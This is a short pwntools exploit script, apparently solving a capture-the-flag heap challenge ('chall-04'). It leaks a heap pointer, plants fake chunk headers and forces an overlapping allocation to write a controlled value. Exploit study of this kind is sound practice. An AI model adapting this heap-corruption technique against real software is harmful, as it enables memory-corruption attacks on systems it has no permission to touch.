from pwn import *

target = process("./chall-04")
gdb.attach(target, gdbscript='b *main+179')

INDEX = b"64"

ALLOCATION_SIZE = b"1504"

ALLOCATION_CHUNK_CONTENTS = b"0"*0x4d0 + p32(0xdeadbeef)

target.recvuntil(b"Chunk0: ")
leak_string = target.recvuntil(b"\n")
leak_value = int(leak_string, 0x10)
heap_base = leak_value - 0x2a0

print("Heap Base is: " + hex(heap_base))

# Our first fake chunk header
CONTENTS_CHUNK0 = b"0"*0x30 + p64(0x00) + p64(0x5f1)

# Our second two fake chunk headers
CONTENTS_CHUNK1 = p64(0x00) + p64(0x21) + p64(0x00)*3 + p64(0x21)

target.recvuntil(b"Chunk0 Contents:\n")
target.send(CONTENTS_CHUNK0)

target.recvuntil(b"Chunk1 Contents:\n")
target.send(CONTENTS_CHUNK1)

target.recvuntil(b"Index?\n")
target.sendline(INDEX)

target.recvuntil(b"Size of the chunk allocation?\n")
target.sendline(ALLOCATION_SIZE)

target.recvuntil(b"Allocation Chunk Contents.\n")
target.send(ALLOCATION_CHUNK_CONTENTS)


target.interactive()